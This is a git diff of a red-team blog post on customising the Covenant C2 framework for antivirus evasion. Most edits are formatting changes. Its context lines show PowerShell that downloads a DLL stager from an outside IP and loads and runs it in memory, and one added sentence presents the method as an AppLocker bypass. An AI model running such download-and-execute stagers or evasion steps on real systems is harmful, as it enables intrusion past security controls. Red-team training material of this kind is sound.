@@ -3,8 +3,8 @@ title: "Customized C2C for AV evasion "
 layout: "post"
 ---
 
-In the last few weeks, i have had the opportunity to experience using the C2-Framework Covenant during the Red Team Operator course by Rastamouse. 
-It is an open-source framework that enables developers to create their own AV-Evasion and C2-Customization projects.
+In the last few weeks, i have had the opportunity to experience using the __C2-Framework__ __Covenant__ during the Red Team Operator course by __Rastamouse__. 
+It is an open-source framework that enables developers to create their own __AV-Evasion__ and __C2-Customization__ projects.
 
 
 
@@ -268,7 +268,7 @@ Now you should have your Grunt checking in on Covenant.
 
 
 
-__Note:__ 🚩 The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell:
+__Note:__ The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell🚩:
 
 
 ```powershell
@@ -299,6 +299,8 @@ PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234
 PS > [System.Reflection.Assembly]::Load($dll)
 PS > [MonkStager.MonkStager]::Execute()
 ```
+
+This DLL technique can be particulary useful when dealing with AppLocker bypass as it is common occurrence that the DLL AppLocker rules are not enabled or enforced 🚩.
 
 ### 4) Initial delivery 
 
